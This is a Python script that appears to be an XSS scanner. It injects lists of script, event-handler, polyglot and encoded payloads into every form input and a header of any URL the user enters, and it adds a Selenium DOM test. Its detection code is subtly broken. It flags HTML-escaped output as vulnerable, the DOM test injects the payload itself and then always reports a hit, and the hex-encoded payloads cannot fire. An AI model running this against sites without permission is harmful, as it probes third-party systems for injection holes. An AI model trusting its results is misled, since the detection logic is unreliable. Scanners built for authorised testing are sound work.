import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote
import re
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>", 
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "javascript:alert('XSS')", 
    "<body onload=alert('XSS')>",
    "<math><mtext><!–><script>alert('XSS')</script></mtext></math>", 
]

ENCODED_PAYLOADS = [
    quote(payload) for payload in XSS_PAYLOADS
] + [
    payload.encode("utf-8").hex() for payload in XSS_PAYLOADS
]

POLYGLOT_PAYLOADS = [
    "\"><img src=x onerror=alert('XSS')>",
    "\"><svg/onload=alert('XSS')>",
    "<svg><script>alert(1)</script>",
    "<script>alert`1`</script>",
    "';alert(1)//",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_service = Service("C:/chromedriver.exe")
driver = webdriver.Chrome(service=chrome_service, options=chrome_options)

def scan_url(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")

        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} forms on {url}")

        for form in forms:
            form_details = {}
            action = form.attrs.get("action", "").lower()
            method = form.attrs.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea", "select"])
            form_details["action"] = urljoin(url, action)
            form_details["method"] = method
            form_details["inputs"] = [input.attrs.get("name", "") for input in inputs if input.attrs.get("name")]

            all_payloads = XSS_PAYLOADS + ENCODED_PAYLOADS + POLYGLOT_PAYLOADS

            for payload in all_payloads:
                data = {input_name: payload for input_name in form_details["inputs"]}

                try:
                    if method == "post":
                        test_response = requests.post(form_details["action"], data=data, headers=HEADERS, timeout=10)
                    else:
                        test_response = requests.get(form_details["action"], params=data, headers=HEADERS, timeout=10)

                    if detect_xss(test_response.text, payload):
                        print(f"[!] XSS Vulnerability detected in {form_details['action']} with payload: {payload}")
                        break  # Stop testing if vulnerability is found
                    else:
                        print(f"[-] No XSS Vulnerability found in {form_details['action']} with payload: {payload}")

                except requests.RequestException as e:
                    print(f"[-] Error submitting form to {form_details['action']}: {e}")

        test_dom_xss(url)

    except requests.RequestException as e:
        print(f"[-] Error scanning {url}: {e}")

def detect_xss(response_text, payload):
    if payload in response_text:
        return True
    encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
    if encoded_payload in response_text:
        return True
    if re.search(re.escape(payload), response_text, re.IGNORECASE):
        return True
    return False

def test_dom_xss(url):
    try:
        driver.get(url)
        time.sleep(3)  # Wait for JavaScript to execute

        for payload in XSS_PAYLOADS:
            driver.execute_script(f"document.write('{payload}');")
            time.sleep(1)  # Allow time for execution
            if "XSS" in driver.page_source:
                print(f"[!] DOM-Based XSS detected with payload: {payload}")

    except Exception as e:
        print(f"[-] Error testing DOM XSS: {e}")

def check_header_reflection(url):
    test_payload = XSS_PAYLOADS[0]
    headers = {"X-User-Input": test_payload}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if test_payload in response.text:
            print(f"[!] Potential header-based XSS detected with payload: {test_payload}")
    except requests.RequestException as e:
        print(f"[-] Error testing header reflection: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL to scan: ")
    scan_url(target_url)
    check_header_reflection(target_url)
